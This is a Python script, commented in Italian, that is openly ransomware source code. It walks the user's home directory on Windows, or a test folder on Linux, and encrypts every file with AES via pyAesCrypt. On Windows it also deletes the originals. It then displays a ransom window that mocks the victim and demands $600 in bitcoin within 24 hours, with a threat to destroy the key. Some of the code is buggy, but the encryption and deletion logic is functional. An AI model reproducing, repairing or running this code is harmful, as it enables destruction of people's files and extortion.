import getpass,platform,re,random
import os
import pyAesCrypt,sys
from os import walk
import webbrowser 
from PIL import ImageTk, Image
import PIL
import requests
from io import BytesIO
from tkinter import *
from tkinter import scrolledtext
from tkinter import filedialog
from tkinter import messagebox
from tkinter import scrolledtext
from tkinter import LabelFrame
from tkinter import Label
from tkinter import Button

import tkinter.font as font

#GENERAZIONE_DI_PASSWORD
def genera_password(lunghezza):
    caratteri = ('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
                 '!£$%#&=?0123456789')
    while True:
        password = ''
        for i in range(0, int(lunghezza)):
            password += random.choice(caratteri)
        if valida_password(password):
            break
        else:
           pass
    return password

def valida_password(password):
    condizione_valida = ('^.*(?=.{'+str(len(password))+',})(?=.*\d)(?=.*[a-z])'
                        '(?=.*[A-Z])(?=.*[!£$%&#=?]).*$')
    return re.findall(condizione_valida, password)


#########CIFRATURA################
def cifra(filename,password):
    bufferSize = 64 * 1024
    key = str(password)
    pyAesCrypt.encryptFile(filename, filename +".crypt", key, bufferSize)
    print("File cifrati")



#BITCOIN
def what_is_bitcoin():
    url = 'https://bitcoin.org'
    # Open browser to the https://bitcoin.org so they know what bitcoin is
    webbrowser.open(url)




def finish():
    sys.exit(0)

#########DECIFRATURA##############
def decifra():
    global pattern_linux
    files = []
    piattaforma=platform.system()
    if piattaforma == 'Linux':
        path=pattern_linux
    elif piattaforma == 'Windows':
        path=pattern_windows

    for r, d, f in os.walk(path):
        for file in f:
            files.append(os.path.join(r, file))

    for f in files:
        f=str(f)
        bufferSize = 64 * 1024
        key = password.get()
        pyAesCrypt.decryptFile(f, f +".decrypt", key, bufferSize)
        print("File decriptati perfettamente")
        try:
            pyAesCrypt.decryptFile(f, f +".decrypt", key, bufferSize)
            print("File decriptati perfettamente")
            app1 = Tk()   
            Input_step = Label(app1,text="The password is correct", font="Arial 12 bold italic").pack()
            submit = Button(app1, text='Finish',command=finish).pack()
            app1.mainloop()
        except Exception as e:
            pass
           



###FUNZIONE PRINCIPALE###############
if __name__ == '__main__':
    username = getpass.getuser()
    pattern_linux=f"/home/{username}/Cartella_di_prova/"
    pattern_windows =f" C:\\Users\\{username}"
    lunghezza = 125
    password_generata = genera_password(lunghezza)
    print('Password generata: {}'.format(password_generata))
    piattaforma=platform.system()
    if piattaforma == 'Linux':
        print("La macchina ha su Linux")
        username = getpass.getuser()
        files = []
        for r, d, f in os.walk(pattern_linux):
            for file in f:
                files.append(os.path.join(r, file))

        for f in files:
            f=str(f)
            cifra=cifra(f,password_generata)
            #os.remove(f)
            app = Tk()   
            password = StringVar() #Password variable
            Input_step = Label(app,text="You are hacked :D You had to make backups my friend.\nDon't close this screen, otherwise you can't able to recover your file", font="Arial 20 bold italic").pack()
            
            response = requests.get("https://www.sanita-digitale.com/files/2019/03/hacker.png")
            load = PIL.Image.open(BytesIO(response.content))
            render = ImageTk.PhotoImage(load)
            panel = Label(app, image = render,  width=10, height=10)
            panel.image = render
            panel.pack(side = "bottom", fill = "both", expand = "yes")

            myFont2 = font.Font(size=30)   
            passEntry = Entry(app, textvariable=password, show='*')
            passEntry['font'] = myFont2
            passEntry.pack()

            myFont1 = font.Font(size=30)    
            submit = Button(app, text='Decrypt',command=decifra)
            submit['font'] = myFont1
            submit.pack()
            
            
            myFont = font.Font(size=30)   
            submit2 = Button(app, text='Bitcoin',command=what_is_bitcoin)
            submit2['font'] = myFont
            submit2.pack()
            Input_step1= Label(app, text="\n\n\nIf you want to get your files back send $600 to this wallet in bitcoin within 24 hours otherwise I will delete the decryption key forever.\n\nThis is my wallet ID: d64689ed-d3f1-4c58-b4f2-97da42edab5b",font="Arial 20 bold italic").pack()
            app.mainloop()


    elif piattaforma == 'Windows':
        print("La macchina ha su Windows")
        username = getpass.getuser()
        files = []
        for r, d, f in os.walk(pattern_windows):
            for file in f:
                files.append(os.path.join(r, file))

        for f in files:
            f=str(f)
            cifra=cifra(f,password_generata)
            os.remove(f)
            app = Tk()   
            password = StringVar() #Password variable
            Input_step = Label(app,text="You are hacked :D You had to make backups my friend.\nDon't close this screen, otherwise you can't able to recover your file", font="Arial 20 bold italic").pack()
            
            response = requests.get("https://www.sanita-digitale.com/files/2019/03/hacker.png")
            load = PIL.Image.open(BytesIO(response.content))
            render = ImageTk.PhotoImage(load)
            panel = Label(app, image = render,  width=10, height=10)
            panel.image = render
            panel.pack(side = "bottom", fill = "both", expand = "yes")

            myFont2 = font.Font(size=30)   
            passEntry = Entry(app, textvariable=password, show='*')
            passEntry['font'] = myFont2
            passEntry.pack()

            myFont1 = font.Font(size=30)    
            submit = Button(app, text='Decrypt',command=decifra)
            submit['font'] = myFont1
            submit.pack()
            
            
            myFont = font.Font(size=30)   
            submit2 = Button(app, text='Bitcoin',command=what_is_bitcoin)
            submit2['font'] = myFont
            submit2.pack()
            Input_step1= Label(app, text="\n\n\nIf you want to get your files back send $600 to this wallet in bitcoin within 24 hours otherwise I will delete the decryption key forever.\n\nThis is my wallet ID: d64689ed-d3f1-4c58-b4f2-97da42edab5b",font="Arial 20 bold italic").pack()
            app.mainloop()

       
    elif piattaforma == 'Darwin':
        username = getpass.getuser()
        print("La macchina ha su MAC OS")
        
  